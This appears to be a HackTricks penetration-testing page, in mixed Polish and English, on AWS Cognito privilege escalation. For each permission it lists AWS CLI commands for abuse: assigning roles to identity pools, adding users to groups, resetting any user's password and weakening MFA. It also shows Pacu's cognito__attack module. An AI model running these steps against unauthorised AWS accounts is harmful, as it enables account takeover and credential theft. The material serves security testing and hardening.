# AWS - Cognito Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## Cognito

For more info about Cognito check:

{{#ref}}
../../aws-services/aws-cognito-enum/
{{#endref}}

### Gathering credentials from Identity Pool

As Cognito can grant **IAM role credentials** to both **authenticated** an **unauthenticated** **users**, if you locate the **Identity Pool ID** of an application (should be hardcoded on it) you can obtain new credentials and therefore privesc (inside an AWS account where you probably didn't even have any credential previously).

For more information [**sprawdź tę stronę**](../../aws-unauthenticated-enum-access/index.html#cognito).

**Potencjalny wpływ:** Bezpośredni privesc do roli usług przypisanej do użytkowników nieuwierzytelnionych (a prawdopodobnie także do tej przypisanej użytkownikom uwierzytelnionym).

### `cognito-identity:SetIdentityPoolRoles`, `iam:PassRole`

Dzięki temu uprawnieniu możesz **przyznać dowolną cognito role** użytkownikom uwierzytelnionym/nieuwierzytelnionym aplikacji cognito.
```bash
aws cognito-identity set-identity-pool-roles \
--identity-pool-id <identity_pool_id> \
--roles unauthenticated=<role ARN>

# Get credentials
## Get one ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Get creds for that id
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374"
```
Jeśli aplikacja Cognito **nie ma włączonej obsługi użytkowników nieuwierzytelnionych** może być również potrzebne uprawnienie `cognito-identity:UpdateIdentityPool`, aby to włączyć.

**Potencjalny wpływ:** Bezpośredni privesc do dowolnej roli Cognito.

### `cognito-identity:update-identity-pool`

Atakujący posiadający to uprawnienie mógłby np. skonfigurować Cognito User Pool pod swoją kontrolą lub dowolnego innego dostawcę tożsamości, w którym może się zalogować, jako **sposób uzyskania dostępu do tego Cognito Identity Pool**. Wtedy samo **zalogowanie się** u tego dostawcy użytkownika **umożliwi mu dostęp do skonfigurowanej roli authenticated w Identity Pool**.
```bash
# This example is using a Cognito User Pool as identity provider
## but you could use any other identity provider
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
[--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
--cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Now you need to login to the User Pool you have configured
## after having the id token of the login continue with the following commands:

# In this step you should have already an ID Token
aws cognito-identity get-id \
--identity-pool-id <id_pool_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Get the identity_id from thr previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```
Można też **nadużyć tego uprawnienia, aby umożliwić basic auth**:
```bash
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
--allow-unauthenticated-identities
--allow-classic-flow
```
**Potencjalny wpływ**: Kompromitacja skonfigurowanej uwierzytelnionej roli IAM w ramach identity pool.

### `cognito-idp:AdminAddUserToGroup`

To uprawnienie pozwala **dodać użytkownika Cognito do grupy Cognito**, dlatego atakujący mógłby nadużyć tego uprawnienia, aby dodać użytkownika, którego kontroluje, do innych grup z **lepszymi** uprawnieniami lub **innymi rolami IAM**:
```bash
aws cognito-idp admin-add-user-to-group \
--user-pool-id <value> \
--username <value> \
--group-name <value>
```
**Potencjalny wpływ:** Privesc do innych grup Cognito oraz ról IAM przypisanych do User Pool Groups.

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

Atakujący posiadający te uprawnienia mógłby **utworzyć/zaktualizować grupy** z **każdą IAM rolą, która może być użyta przez skompromitowany Cognito Identity Provider** i uczynić skompromitowanego użytkownika częścią grupy, uzyskując dostęp do wszystkich tych ról:
```bash
aws cognito-idp create-group --group-name Hacked --user-pool-id <user-pool-id> --role-arn <role-arn>
```
**Potencjalny wpływ:** Privesc do innych Cognito IAM roles.

### `cognito-idp:AdminConfirmSignUp`

To uprawnienie pozwala **zweryfikować rejestrację**. Domyślnie każdy może zarejestrować się w Cognito applications; jeśli to jest włączone, użytkownik może utworzyć konto z dowolnymi danymi i zweryfikować je przy użyciu tego uprawnienia.
```bash
aws cognito-idp admin-confirm-sign-up \
--user-pool-id <value> \
--username <value>
```
**Potencjalny wpływ:** Indirect privesc do identity pool IAM role dla authenticated users, jeśli możesz zarejestrować nowego użytkownika. Indirect privesc do innych funkcji aplikacji poprzez możliwość potwierdzania dowolnego konta.

### `cognito-idp:AdminCreateUser`

To uprawnienie pozwala attackerowi utworzyć nowego użytkownika w user pool. Nowy użytkownik jest tworzony jako enabled, jednak będzie musiał zmienić swoje hasło.
```bash
aws cognito-idp admin-create-user \
--user-pool-id <value> \
--username <value> \
[--user-attributes <value>] ([Name=email,Value=email@gmail.com])
[--validation-data <value>]
[--temporary-password <value>]
```
**Potencjalny wpływ:** Bezpośredni privesc do identity pool IAM role dla uwierzytelnionych użytkowników. Pośredni privesc do innych funkcjonalności aplikacji umożliwiających tworzenie dowolnego użytkownika

### `cognito-idp:AdminEnableUser`

To uprawnienie może pomóc w bardzo rzadkim scenariuszu, gdy atakujący znalazł dane logowania wyłączonego użytkownika i musi je **ponownie włączyć**.
```bash
aws cognito-idp admin-enable-user \
--user-pool-id <value> \
--username <value>
```
**Potencjalny wpływ:** Pośrednie privesc do identity pool IAM role dla uwierzytelnionych użytkowników oraz przejęcie uprawnień użytkownika, jeśli atakujący posiadałby credentials wyłączonego użytkownika.

### `cognito-idp:AdminInitiateAuth`, **`cognito-idp:AdminRespondToAuthChallenge`**

To uprawnienie pozwala zalogować się za pomocą [**method ADMIN_USER_PASSWORD_AUTH**](../../aws-services/aws-cognito-enum/cognito-user-pools.md#admin_no_srp_auth-and-admin_user_password_auth)**.** Więcej informacji w podanym linku.

### `cognito-idp:AdminSetUserPassword`

To uprawnienie pozwoli atakującemu **zmienić hasło dowolnego użytkownika**, umożliwiając mu podszycie się pod dowolnego użytkownika (który nie ma włączonego MFA).
```bash
aws cognito-idp admin-set-user-password \
--user-pool-id <value> \
--username <value> \
--password <value> \
--permanent
```
**Potential Impact:** Bezpośredni privesc do potencjalnie dowolnego użytkownika, czyli dostęp do wszystkich grup, których każdy użytkownik jest członkiem, oraz dostęp do Identity Pool authenticated IAM role.

### `cognito-idp:AdminSetUserSettings` | `cognito-idp:SetUserMFAPreference` | `cognito-idp:SetUserPoolMfaConfig` | `cognito-idp:UpdateUserPool`

**AdminSetUserSettings**: Attacker mógłby potencjalnie nadużyć tego uprawnienia, aby ustawić telefon komórkowy będący pod jego kontrolą jako **SMS MFA of a user**.
```bash
aws cognito-idp admin-set-user-settings \
--user-pool-id <value> \
--username <value> \
--mfa-options <value>
```
**SetUserMFAPreference:** Podobnie jak poprzednie, to uprawnienie może być użyte do ustawienia preferencji MFA użytkownika, co pozwala na bypass ochrony MFA.
```bash
aws cognito-idp admin-set-user-mfa-preference \
[--sms-mfa-settings <value>] \
[--software-token-mfa-settings <value>] \
--username <value> \
--user-pool-id <value>
```
**SetUserPoolMfaConfig**: Podobnie jak poprzednie, to uprawnienie może być użyte do ustawienia preferencji MFA dla user pool, aby umożliwić bypass ochrony MFA.
```bash
aws cognito-idp set-user-pool-mfa-config \
--user-pool-id <value> \
[--sms-mfa-configuration <value>] \
[--software-token-mfa-configuration <value>] \
[--mfa-configuration <value>]
```
**UpdateUserPool:** Możliwe jest także zaktualizowanie user pool, aby zmienić politykę MFA. [Check cli here](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool.html).

**Potential Impact:** Pośrednie privesc do potencjalnie dowolnego użytkownika, którego poświadczenia zna atakujący; może to pozwolić na obejście ochrony MFA.

### `cognito-idp:AdminUpdateUserAttributes`

Atakujący z tym uprawnieniem mógłby zmienić adres e-mail lub numer telefonu lub dowolny inny atrybut użytkownika, którym zarządza, aby spróbować uzyskać więcej uprawnień w aplikacji zależnej.\
To pozwala zmienić adres e-mail lub numer telefonu i oznaczyć go jako zweryfikowany.
```bash
aws cognito-idp admin-update-user-attributes \
--user-pool-id <value> \
--username <value> \
--user-attributes <value>
```
**Potencjalny wpływ:** Potencjalne pośrednie privesc w aplikacji bazowej korzystającej z Cognito User Pool, która przyznaje uprawnienia na podstawie atrybutów użytkownika.

### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

Atakujący z tym uprawnieniem może **utworzyć nowy User Pool Client mniej restrykcyjny** niż już istniejące klienty puli. Na przykład nowy client mógłby umożliwiać dowolny sposób uwierzytelniania, nie mieć żadnego secret, mieć wyłączone unieważnianie tokenów, pozwalać na dłuższy okres ważności tokenów...

To samo można osiągnąć, jeśli zamiast tworzenia nowego clienta, **zmodyfikowany zostanie istniejący**.

W [**command line**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html) (lub w [**update one**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)) zobaczysz wszystkie opcje — sprawdź to!
```bash
aws cognito-idp create-user-pool-client \
--user-pool-id <value> \
--client-name <value> \
[...]
```
**Potential Impact:** Potencjalny pośredni privesc dla użytkownika autoryzowanego przez Identity Pool używanego przez User Pool poprzez utworzenie nowego klienta, który poluzowuje środki bezpieczeństwa i umożliwia atakującemu zalogowanie się jako użytkownik, którego udało mu się utworzyć.

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

Atakujący może wykorzystać to uprawnienie do tworzenia użytkowników przez przesłanie pliku csv z nowymi użytkownikami.
```bash
# Create a new import job
aws cognito-idp create-user-import-job \
--job-name <value> \
--user-pool-id <value> \
--cloud-watch-logs-role-arn <value>

# Use a new import job
aws cognito-idp start-user-import-job \
--user-pool-id <value> \
--job-id <value>

# Both options before will give you a URL where you can send the CVS file with the users to create
curl -v -T "PATH_TO_CSV_FILE" \
-H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```
(W przypadku, gdy utworzysz nowe zadanie importu możesz również potrzebować uprawnienia iam passrole — nie testowałem tego jeszcze).

**Potencjalny wpływ:** Bezpośredni privesc do identity pool IAM role dla uwierzytelnionych użytkowników. Pośredni privesc do innych funkcjonalności aplikacji umożliwiających tworzenie dowolnego użytkownika.

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

Atakujący mógłby utworzyć nowego dostawcę tożsamości, aby następnie móc **login through this provider**.
```bash
aws cognito-idp create-identity-provider \
--user-pool-id <value> \
--provider-name <value> \
--provider-type <value> \
--provider-details <value> \
[--attribute-mapping <value>] \
[--idp-identifiers <value>]
```
**Potencjalny wpływ:** Bezpośredni privesc do roli IAM identity pool dla uwierzytelnionych użytkowników. Pośredni privesc do innych funkcji aplikacji pozwalający na tworzenie dowolnego użytkownika.

### cognito-sync:\* Analiza

To bardzo częste uprawnienie domyślnie w rolach Cognito Identity Pools. Nawet jeśli wildcard w uprawnieniach zawsze wygląda źle (szczególnie pochodzący od AWS), **nadane uprawnienia nie są szczególnie przydatne z perspektywy atakującego**.

To uprawnienie pozwala na odczyt informacji o Identity Pools oraz Identity IDs wewnątrz Identity Pools (co nie jest informacją wrażliwą).\
Identity IDs might have [**Datasets**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API_Dataset.html) assigned to them, which are information of the sessions (AWS define it like a **saved game**). Może być możliwe, że zawierają jakiś rodzaj informacji wrażliwych (ale prawdopodobieństwo jest dość niskie). W [**enumeration page**](../../aws-services/aws-cognito-enum/index.html) znajdziesz informacje, jak uzyskać dostęp do tych danych.

Atakujący mógłby też użyć tych uprawnień, aby **enroll himself to a Cognito stream that publish changes** na tych datasetach lub do **lambda that triggers on cognito events**. Nie widziałem tego w użyciu i nie spodziewałbym się tutaj informacji wrażliwych, ale nie jest to niemożliwe.

### Automatyczne narzędzia

- [Pacu](https://github.com/RhinoSecurityLabs/pacu), the AWS exploitation framework, teraz zawiera moduły "cognito__enum" i "cognito__attack", które automatyzują enumerację wszystkich zasobów Cognito w koncie i wskazują słabe konfiguracje, user attributes używane do kontroli dostępu itd., oraz automatyzują tworzenie użytkowników (w tym wsparcie MFA) i privilege escalation oparte na modyfikowalnych custom attributes, usable identity pool credentials, assumable roles in id tokens, itd.

For a description of the modules' functions see part 2 of the [blog post](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). For installation instructions see the main [Pacu](https://github.com/RhinoSecurityLabs/pacu) page.

#### Użycie

Przykładowe użycie cognito__attack do próby utworzenia użytkownika i wszystkich wektorów privesc przeciwko danemu identity pool i user pool client:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Przykładowe użycie cognito__enum do zebrania wszystkich user pools, user pool clients, identity pools, users itp. widocznych w bieżącym koncie AWS:
```bash
Pacu (new:test) > run cognito__enum
```
- [Cognito Scanner](https://github.com/padok-team/cognito-scanner) jest narzędziem CLI w Pythonie, które implementuje różne ataki na Cognito, w tym privesc escalation.

#### Instalacja
```bash
$ pip install cognito-scanner
```
#### Użycie
```bash
$ cognito-scanner --help
```
Aby uzyskać więcej informacji, sprawdź [https://github.com/padok-team/cognito-scanner](https://github.com/padok-team/cognito-scanner)

{{#include ../../../../banners/hacktricks-training.md}}
